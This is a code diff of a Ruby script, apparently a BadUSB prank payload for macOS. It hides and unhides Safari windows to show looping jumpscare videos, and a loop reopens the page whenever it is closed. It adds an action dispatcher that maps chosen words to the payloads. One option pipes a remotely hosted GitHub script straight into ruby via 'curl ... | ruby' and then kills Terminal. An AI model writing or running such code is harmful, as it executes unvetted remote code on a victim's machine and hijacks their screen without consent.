@@ -82,8 +82,8 @@ def persistent_jumpscare(video_url)
     system("open -a Safari '#{html_file}'")
     # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.75 seconds (0.5 + extra 0.25 seconds).
-    sleep 0.75
+    # Wait 0.85 seconds before unhiding—simulating waiting until sound is detected.
+    sleep 0.85
     # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
     # Let the jumpscare play for 1 second.
@@ -102,10 +102,7 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If not found, force reopen the jumpscare page.
-    unless result.include?("true")
-      system("open -a Safari '#{html_file}'")
-    end
+    # If the page is closed, the loop will reopen it.
     sleep 3
   end
 end
@@ -113,6 +110,25 @@ end
 # --- Run Secret (Rickroll) Script ---
 def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
+end
+
+# --- Subscriber Action ---
+def subscriber_action(choice)
+  ch = choice.strip.downcase
+  case ch
+  when "hawk"
+    run_secret_script
+    system("killall Terminal")
+    exit 0
+  when "tuah"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
+  when "sydney lover"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
+  when "girlpower"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
+  else
+    puts "Unexpected button choice: #{choice}"
+  end
 end
 
 # --- Main Program Flow ---
